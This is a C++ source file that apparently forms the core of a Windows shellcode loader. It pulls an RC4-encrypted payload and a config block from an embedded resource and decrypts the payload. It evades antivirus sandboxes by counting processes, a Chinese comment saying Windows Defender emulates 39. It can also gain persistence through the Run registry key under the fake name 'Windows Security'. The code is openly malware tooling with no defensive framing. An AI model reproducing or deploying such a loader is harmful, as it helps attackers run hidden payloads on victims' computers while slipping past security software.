#include<windows.h>
#include<TlHelp32.h>
typedef LPVOID(WINAPI *pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
typedef HRSRC(WINAPI *pfnFindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
typedef DWORD(WINAPI *pfnSizeofResource)(HMODULE hModule, HRSRC hResInfo);
typedef HGLOBAL(WINAPI *pfnLoadResource)(HMODULE hModule, HRSRC hResInfo);
typedef LPVOID(WINAPI *pfnLockResource)(HGLOBAL hResData);

/**********************************************************************
* @Function: GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
* @Description: Get shellcode from local resource
* @Parameter: resourceID, the rc_data resource ID
* @Parameter: shellcodeSize,the size of shellcode
* @Return: unsigned char* shellcode,the pointer to shellcode
**********************************************************************/
unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize);


/**********************************************************************
* @Function:  StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
* @Description: RC4 crypt
* @Parameter: Data,the pointer to data will be encrypted or decrypted
* @Parameter: Length,the size of data
* @Parameter: Key,the pointer to key used to encrypt or decrypt
* @Parameter: KeyLength,the size of data
* @Return: null
**********************************************************************/
void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}

/**********************************************************************
* @Struct: CONFIG
* @Description: config information
* @Member: antisandbox,do you want anti sandbox from options
* @Member: autostart,do you want autostart from options
* @Member: Key[128], 128 bit randomly generated key
**********************************************************************/
struct CONFIG
{
	BOOL antisandbox;
	BOOL autostart;
	unsigned char key[128];
};

/**********************************************************************
* @Function: AntiSimulation()
* @Description: anti av's sandbox by check processnum.you can change this function to use other ways.
* @Parameter: null
* @Return: null
**********************************************************************/
void AntiSimulation()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		return;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	int procnum = 0;
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe))
	{
		procnum++;
	}
	if (procnum <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
	{
		exit(1);
	}
}

/**********************************************************************
* @Function: AutoStart()
* @Description: autostart by reg.you can change this function to use other ways.
* @Parameter: null
* @Return: null
**********************************************************************/
void AutoStart()
{
	HKEY hKey;
	char currentpath[256] = { 0 };
	GetModuleFileNameA(NULL, currentpath, 256);
	if (!RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
	{
		RegSetValueExA(hKey, "Windows Security", 0, REG_SZ, (PUCHAR)currentpath, strlen(currentpath));
		RegCloseKey(hKey);
	}
}

/**********************************************************************
* @Function: init(BOOL anti_sandbox, BOOL autostart)
* @Description: initialization before working
* @Parameter: anti_sandbox,do you want anti sandbox
* @Parameter: autostart,do you want autostart
* @Return: null
**********************************************************************/
void init(BOOL anti_sandbox, BOOL autostart)
{
	if (anti_sandbox)  //反仿真
	{
		AntiSimulation();
	}
	if (autostart)  //注册表添加自启动
	{
		AutoStart();
	}
}

unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
{
	//0.Get functions
	HMODULE hkmodule = GetModuleHandle(L"kernel32.dll");
	pfnFindResourceW fnFindResourceW = (pfnFindResourceW)GetProcAddress(hkmodule, "FindResourceW");
	pfnSizeofResource fnSizeofResource = (pfnSizeofResource)GetProcAddress(hkmodule, "SizeofResource");
	pfnLoadResource fnLoadResource = (pfnLoadResource)GetProcAddress(hkmodule, "LoadResource");
	pfnLockResource fnLockResource = (pfnLockResource)GetProcAddress(hkmodule, "LockResource");
	//1.Get resource's pointer
	HRSRC hRsrc = fnFindResourceW(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRsrc == NULL)
		return nullptr;
	DWORD totalSize = fnSizeofResource(NULL, hRsrc);
	if (totalSize == 0)
		return nullptr;
	HGLOBAL hGlobal = fnLoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return nullptr;
	LPVOID pBuffer = fnLockResource(hGlobal);
	if (pBuffer == NULL)
		return nullptr;

	CONFIG config = { 0 };
	memcpy(&config, pBuffer, sizeof(CONFIG));
	//2.Initialization
	init(config.antisandbox, config.autostart);
	unsigned char* shellcode = new unsigned char[totalSize - sizeof(CONFIG)];
	shellcodeSize = totalSize - sizeof(CONFIG);
	//3.Getshellcode
	memcpy(shellcode, (unsigned char*)pBuffer + sizeof(CONFIG), shellcodeSize);
	StreamCrypt(shellcode, shellcodeSize, config.key, 128);
	return shellcode;
}